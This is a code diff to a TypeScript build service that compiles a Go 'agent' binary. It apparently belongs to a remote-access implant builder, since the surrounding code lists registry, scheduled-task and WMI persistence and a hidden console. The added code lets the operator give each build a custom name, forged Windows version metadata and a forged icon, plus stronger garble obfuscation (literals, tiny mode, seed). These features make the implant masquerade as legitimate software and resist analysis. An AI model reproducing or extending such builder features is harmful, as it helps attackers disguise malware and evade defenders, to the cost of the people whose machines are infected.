@@ -66,6 +66,16 @@ type BuildProcessConfig = {
   hideConsole?: boolean;
   noPrinting?: boolean;
   builtByUserId?: number;
+  outputName?: string;
+  garbleLiterals?: boolean;
+  garbleTiny?: boolean;
+  garbleSeed?: string;
+  assemblyTitle?: string;
+  assemblyProduct?: string;
+  assemblyCompany?: string;
+  assemblyVersion?: string;
+  assemblyCopyright?: string;
+  iconBase64?: string;
 };
 
 const VALID_PERSISTENCE_METHODS = new Set(['startup', 'registry', 'taskscheduler', 'wmi']);
@@ -128,6 +138,9 @@ export async function startBuildProcess(
       }
     });
   };
+
+  let winresTempDir: string | null = null;
+  const generatedSysoFiles: string[] = [];
 
   const buildStartedAt = Date.now();
   const keepAliveTimer = setInterval(() => {
@@ -227,12 +240,120 @@ export async function startBuildProcess(
     const buildTag = uuidv4();
     sendToStream({ type: "output", text: `Build tag: ${buildTag}\n`, level: "info" });
 
+    if (config.outputName) {
+      sendToStream({ type: "output", text: `Custom output name: ${config.outputName}\n`, level: "info" });
+    }
+
+    const hasAssemblyData = !!(config.assemblyTitle || config.assemblyProduct || config.assemblyCompany || config.assemblyVersion || config.assemblyCopyright || config.iconBase64);
+    const hasWindowsTargets = platformsToBuild.some((p) => p.startsWith("windows-"));
+
+    if (hasAssemblyData && hasWindowsTargets) {
+      sendToStream({ type: "status", text: "Generating Windows resource data..." });
+
+      const goEnvResult = await $`go env GOPATH`.quiet();
+      const goPath = goEnvResult.stdout.toString().trim();
+      const goBinDir = process.env.GOBIN || (goPath ? path.join(goPath, "bin") : "");
+      const winresExe = process.platform === "win32" ? "go-winres.exe" : "go-winres";
+      let winresBin = "go-winres";
+
+      let hasWinres = false;
+      if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
+        winresBin = path.join(goBinDir, winresExe);
+        hasWinres = true;
+      } else {
+        try {
+          await $`go-winres version`.quiet();
+          hasWinres = true;
+        } catch {
+          try {
+            sendToStream({ type: "output", text: "Installing go-winres...\n", level: "info" });
+            await $`go install github.com/tc-hib/go-winres@latest`.env({ ...process.env, GOMODCACHE: goModCacheDir }).quiet();
+            if (goBinDir && fs.existsSync(path.join(goBinDir, winresExe))) {
+              winresBin = path.join(goBinDir, winresExe);
+              hasWinres = true;
+            }
+          } catch (installErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Failed to install go-winres: ${installErr.message || installErr}. Assembly data/icon will be skipped.\n`, level: "warn" });
+          }
+        }
+      }
+
+      if (hasWinres) {
+        sendToStream({ type: "output", text: `Using go-winres: ${winresBin}\n`, level: "info" });
+        winresTempDir = path.join(outDir, `.winres-${buildId.substring(0, 8)}`);
+        fs.mkdirSync(winresTempDir, { recursive: true });
+
+        const winresConfig: any = {};
+
+        if (config.iconBase64) {
+          try {
+            const iconBuffer = Buffer.from(config.iconBase64, "base64");
+            const iconPath = path.join(winresTempDir, "icon.ico");
+            fs.writeFileSync(iconPath, iconBuffer);
+            winresConfig["RT_GROUP_ICON"] = { "#1": { "0000": "icon.ico" } };
+            sendToStream({ type: "output", text: `Icon embedded (${iconBuffer.length} bytes)\n`, level: "info" });
+          } catch (iconErr: any) {
+            sendToStream({ type: "output", text: `WARNING: Failed to process icon: ${iconErr.message}. Skipping icon.\n`, level: "warn" });
+          }
+        }
+
+        const versionStr = config.assemblyVersion || "0.0.0.0";
+        const versionInfo: any = {
+          "0409": {
+            "FileDescription": config.assemblyTitle || "",
+            "ProductName": config.assemblyProduct || "",
+            "CompanyName": config.assemblyCompany || "",
+            "FileVersion": versionStr,
+            "ProductVersion": versionStr,
+            "LegalCopyright": config.assemblyCopyright || "",
+            "OriginalFilename": config.outputName ? (config.outputName + ".exe") : "",
+          },
+        };
+
+        winresConfig["RT_VERSION"] = {
+          "#1": {
+            "0000": {
+              "fixed": {
+                "file_version": versionStr,
+                "product_version": versionStr,
+              },
+              "info": versionInfo,
+            },
+          },
+        };
+
+        const winresJsonPath = path.join(winresTempDir, "winres.json");
+        fs.writeFileSync(winresJsonPath, JSON.stringify(winresConfig, null, 2));
+        sendToStream({ type: "output", text: `Winres config: ${winresJsonPath}\n`, level: "info" });
+
+        const sysoOutPrefix = path.join(clientDir, "cmd", "agent", "rsrc");
+        try {
+          const winresResult = await $`${winresBin} make --in ${winresJsonPath} --out ${sysoOutPrefix}`.cwd(winresTempDir).nothrow().quiet();
+          if (winresResult.exitCode !== 0) {
+            const stderr = winresResult.stderr.toString().trim();
+            sendToStream({ type: "output", text: `WARNING: go-winres failed (exit ${winresResult.exitCode}): ${stderr}\nBuilding without assembly data.\n`, level: "warn" });
+          } else {
+            const agentDir = path.join(clientDir, "cmd", "agent");
+            for (const f of fs.readdirSync(agentDir)) {
+              if (f.startsWith("rsrc") && f.endsWith(".syso")) {
+                generatedSysoFiles.push(path.join(agentDir, f));
+              }
+            }
+            sendToStream({ type: "output", text: `Windows resources generated (${generatedSysoFiles.length} .syso files)\n`, level: "info" });
+          }
+        } catch (winresErr: any) {
+          sendToStream({ type: "output", text: `WARNING: go-winres failed: ${winresErr.message || winresErr}. Building without assembly data.\n`, level: "warn" });
+        }
+      }
+    }
+
     for (const platform of platformsToBuild) {
       const [os, arch, ...rest] = platform.split("-");
       const goarm = arch === "armv7" ? "7" : undefined;
       const actualArch = goarm ? "arm" : arch;
+      const namePrefix = config.outputName || "agent";
       const outputName = deps.sanitizeOutputName(
-        platform.includes("windows") ? `agent-${platform}.exe` : `agent-${platform}`,
+        platform.includes("windows") ? `${namePrefix}-${platform}.exe` : `${namePrefix}-${platform}`,
       );
 
       sendToStream({ type: "status", text: `Building ${platform}...` });
@@ -344,6 +465,15 @@ export async function startBuildProcess(
 
       if (config.obfuscate) {
         sendToStream({ type: "output", text: "Obfuscation enabled (garble)\n", level: "info" });
+        if (config.garbleLiterals) {
+          sendToStream({ type: "output", text: "Garble: obfuscate literals (-literals)\n", level: "info" });
+        }
+        if (config.garbleTiny) {
+          sendToStream({ type: "output", text: "Garble: tiny mode (-tiny)\n", level: "info" });
+        }
+        if (config.garbleSeed) {
+          sendToStream({ type: "output", text: `Garble: seed=${config.garbleSeed}\n`, level: "info" });
+        }
       }
 
       if (config.noPrinting) {
@@ -356,21 +486,25 @@ export async function startBuildProcess(
         logger.info(`[build:${buildId.substring(0, 8)}] Building: ${buildTool} build ${tagArg}${ldflags ? `-ldflags="${ldflags}" ` : ""}-o ${outDir}/${outputName} ./cmd/agent`);
         logger.info(`[build:${buildId.substring(0, 8)}] Environment: GOOS=${os} GOARCH=${actualArch} CGO_ENABLED=${env.CGO_ENABLED} CC=${env.CC || "<default>"}`);
 
-        const buildCmd = config.obfuscate
-          ? (config.noPrinting
-              ? (ldflags
-              ? $`garble build -tags noprint -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`garble build -tags noprint -o ${outDir}/${outputName} ./cmd/agent`)
-              : (ldflags
-              ? $`garble build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`garble build -o ${outDir}/${outputName} ./cmd/agent`))
-          : (config.noPrinting
-              ? (ldflags
-              ? $`go build -tags noprint -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`go build -tags noprint -o ${outDir}/${outputName} ./cmd/agent`)
-              : (ldflags
-              ? $`go build -ldflags=${ldflags} -o ${outDir}/${outputName} ./cmd/agent`
-              : $`go build -o ${outDir}/${outputName} ./cmd/agent`));
+        const garbleFlags: string[] = [];
+        if (config.obfuscate) {
+          if (config.garbleLiterals) garbleFlags.push("-literals");
+          if (config.garbleTiny) garbleFlags.push("-tiny");
+          if (config.garbleSeed) garbleFlags.push(`-seed=${config.garbleSeed}`);
+        }
+
+        const buildArgs: string[] = [];
+        if (config.noPrinting) buildArgs.push("-tags", "noprint");
+        if (ldflags) buildArgs.push(`-ldflags=${ldflags}`);
+        buildArgs.push("-o", `${outDir}/${outputName}`, "./cmd/agent");
+
+        let buildCmd;
+        if (config.obfuscate) {
+          const allArgs = [...garbleFlags, "build", ...buildArgs];
+          buildCmd = $`garble ${allArgs}`;
+        } else {
+          buildCmd = $`go build ${buildArgs}`;
+        }
 
         const proc = buildCmd.env(env).cwd(clientDir).nothrow();
         let result: any;
@@ -445,5 +579,11 @@ export async function startBuildProcess(
     }, 60 * 60 * 1000);
   } finally {
     clearInterval(keepAliveTimer);
+    for (const sysoFile of generatedSysoFiles) {
+      try { fs.unlinkSync(sysoFile); } catch {}
+    }
+    if (winresTempDir) {
+      try { fs.rmSync(winresTempDir, { recursive: true, force: true }); } catch {}
+    }
   }
 }
